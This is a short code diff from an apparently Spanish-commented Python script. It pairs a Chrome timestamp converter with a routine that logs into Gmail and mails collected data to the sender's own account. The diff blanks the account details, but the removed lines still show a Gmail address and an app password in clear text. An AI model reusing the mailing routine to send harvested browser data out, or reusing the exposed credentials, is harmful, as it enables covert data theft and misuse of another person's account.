@@ -111,7 +111,7 @@ def convert_chrome_time(chrome_time):
     return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
 
 def send_data(body):
-    email_sender = 'alferezfelipe@gmail.com'
+    email_sender = ''
     email_receiver = email_sender
 
     # Configura los detalles del mensaje
@@ -128,7 +128,7 @@ def send_data(body):
     server.starttls()
 
     # Inicia sesión con tu cuenta de Gmail
-    server.login(email_sender, 'fsyz fnhh xbix vsoq')
+    server.login(email_sender, '')
 
     # Envía el mensaje
     server.send_message(msg)
